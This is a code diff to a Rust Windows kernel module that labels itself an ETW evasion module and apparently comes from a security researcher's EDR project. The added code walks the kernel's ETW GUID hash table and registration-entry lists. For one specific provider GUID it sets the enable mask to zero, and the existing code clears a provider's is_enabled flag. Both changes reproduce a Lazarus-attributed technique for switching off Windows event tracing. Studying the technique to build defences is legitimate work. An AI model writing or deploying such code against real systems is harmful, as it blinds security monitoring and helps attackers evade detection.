@@ -1,7 +1,7 @@
 //! ETW evasion module.
 //! Source ref of combating techniques, see my EDR: https://github.com/0xflux/ferric-fox/
 
-use core::{ffi::c_void, ptr::null};
+use core::{ffi::c_void, ptr::{null, null_mut}};
 
 use alloc::{
     collections::btree_map::BTreeMap,
@@ -208,10 +208,11 @@ pub fn get_etw_dispatch_table<'a>() -> Result<BTreeMap<&'a str, *const c_void>, 
 #[repr(C)]
 #[derive(Copy, Clone, Debug, Eq, PartialEq)]
 struct EtwRegEntry {
-    unused_0: ListEntry,
+    reg_list: ListEntry,
     unused_1: ListEntry,
     p_guid_entry: *const GuidEntry,
-    // we dont care about the rest of the fields
+    unused: [u8; 0x3A],
+    mask_dword: u32,
 }
 
 /// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_GUID_ENTRY
@@ -222,8 +223,11 @@ struct GuidEntry {
     unused_1: ListEntry,
     unused_2: i64,
     guid: GUID,
-    unused_3: [u8; 0x28],
+    reg_list_head: ListEntry,
+    unused_3: [u8; 0x18],
     provider_enable_info: TraceEnableInfo,
+    unused_4: [u8; 0x120],
+    silo_state: *const c_void,
 }
 
 #[repr(C)]
@@ -378,7 +382,7 @@ pub fn disable_single_guid() -> Result<(), ()> {
                 unsafe {
                     (*(current_guid_entry as *mut GuidEntry)).provider_enable_info.is_enabled = 0u32;
                 }
-                
+
                 println!(
                     "Finished altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}. Address of GUID {:p}",
                     unsafe { *current_guid_entry }.provider_enable_info.is_enabled,
@@ -392,6 +396,135 @@ pub fn disable_single_guid() -> Result<(), ()> {
             current_guid_entry =
                 unsafe { (*current_guid_entry).guid_list.flink as *const GuidEntry };
         }
+    }
+
+    Ok(())
+}
+
+pub fn disable_etw_reg_mask() -> Result<(), ()> {
+    let address = resolve_relative_symbol_offset("EtwSendTraceBuffer", 78)
+        .expect("[ferric-fox] [-] Unable to resolve function EtwSendTraceBuffer")
+        as *const *const EtwSiloDriverState;
+
+    if address.is_null() {
+        println!("[ferric-fox] [-] Pointer to EtwSiloDriverState is null");
+        return Err(());
+    }
+
+    // SAFETY: Null pointer checked above
+    if unsafe { *address }.is_null() {
+        println!("[ferric-fox] [-] Address for EtwSiloDriverState is null");
+        return Err(());
+    }
+
+    // SAFETY: Null pointer checked above
+    let first_hash_address = &(unsafe { &**address }.guid_hash_table);
+
+    for i in 0..64 {
+        let hash_bucket_entry =
+            unsafe { first_hash_address.as_ptr().offset(i) } as *const *mut GuidEntry;
+        if hash_bucket_entry.is_null() {
+            println!("[ferric-fox] [i] Found null pointer whilst traversing list at index: {i}");
+            continue;
+        }
+
+        if unsafe { *hash_bucket_entry }.is_null() {
+            println!(
+                "[ferric-fox] [i] Found null INNER pointer whilst traversing list at index: {i}"
+            );
+            continue;
+        }
+
+        // Add the current outer entry to the map
+        let guid_entry = unsafe { &mut **hash_bucket_entry };
+
+        // Look for other GUID entries under this bucket by traversing the linked list until we get back to
+        // the beginning
+        let first_guid_entry = guid_entry.guid_list.flink as *const GuidEntry;
+        let mut current_guid_entry: *const GuidEntry = null();
+        while first_guid_entry != current_guid_entry {
+            // Assign the first guid to the current in the event its the first iteration, aka the current is
+            // null from the above initialisation.
+            if current_guid_entry.is_null() {
+                current_guid_entry = first_guid_entry;
+            }
+
+            if current_guid_entry.is_null() {
+                println!("[ferric-fox] [-] Current GUID entry is null, which is unexpected.");
+                break;
+            }
+
+            // Occasionally the GUID entry is invalid - leading to what appears to be a malformed GUID (with no references on Google)
+            // and a wildly negative Reference Count, which obviously defeats the purpose of reference counting.
+            // We can identify these from entries which have a null silo state pointer; it is unclear **why** these malformed entries
+            // exist; but given no pointer to the silo state, we can assume this is a purposeful action by the kernel.
+            unsafe {
+                if (*(current_guid_entry)).silo_state.is_null() {
+                    current_guid_entry = (*current_guid_entry).guid_list.flink as *mut GuidEntry;
+                    continue;
+                }
+            }
+
+            let guid_string = unsafe { (*current_guid_entry).guid.to_string() };
+            let _ = unsafe { edit_reg_entry_mask(current_guid_entry, &guid_string) };
+
+            
+            // Walk to the next GUID item
+            // SAFETY: Null pointer dereference checked at the top of while loop
+            current_guid_entry =
+                unsafe { (*current_guid_entry).guid_list.flink as *const GuidEntry };
+        }
+    }
+
+    Ok(())
+}
+
+unsafe fn edit_reg_entry_mask(
+    guid_entry: *const GuidEntry,
+    guid_string: &String,
+) -> Result<(), ()> {
+
+    // We now need to traverse the _ETW_REG_ENTRY linked list for the relevant DWORD field to monitor for tampering
+    let first_reg_entry = (*(guid_entry)).reg_list_head.flink as *const EtwRegEntry;
+
+    let mut current_reg_entry: *const EtwRegEntry = null_mut();
+    while first_reg_entry != current_reg_entry {
+        // Assign the first _ETW_REG_ENTRY to the current in the event its the first iteration, aka the current is
+        // null from the above initialisation.
+        if current_reg_entry.is_null() {
+            current_reg_entry = first_reg_entry;
+        }
+
+        if current_reg_entry.is_null() {
+            println!("[ferric-fox] [-] Current _ETW_REG_ENTRY entry is null, which is unexpected.");
+            break;
+        }
+
+        if (*(current_reg_entry)).reg_list.flink.is_null()
+            || (*(current_reg_entry)).reg_list.blink.is_null()
+        {
+            println!(
+                "[ferric-fox] [i] Flink for next reg list item is null in _ETW_REG_ENTRY: {:p}",
+                current_reg_entry
+            );
+            return Err(());
+        }
+
+        // In the event the mask == 0, we do not want to log it - in these cases the GUID pointer is not initialised and we will encounter
+        // null pointers. Furthermore, from reversing the function EtwEventEnabled which is also referenced in the blog regarding
+        // Lazarus, if the mask == 0, then the relevant arm of the function is not taken, so there is no point recording it.
+        if (*(current_reg_entry)).mask_dword == 0 {
+            return Err(());
+        }
+
+        if *guid_string.to_ascii_lowercase() == "F25BCD2E-2690-55DC-3BC4-07B65B1B41C9".to_string().to_ascii_lowercase() {
+            unsafe { (*(current_reg_entry as *mut EtwRegEntry)).mask_dword = 0 };
+            println!("[ferric-fox] Modified F25BCD2E-2690-55DC-3BC4-07B65B1B41C9 mask to 0. _ETW_REG_ENTRY address: {:p}", current_reg_entry);
+        }
+
+        // Walk to the next _ETW_REG_ENTRY item
+        // SAFETY: Null pointer dereference checked at the top of while loop
+        current_reg_entry = (*current_reg_entry).reg_list.flink as *const _;
     }
 
     Ok(())
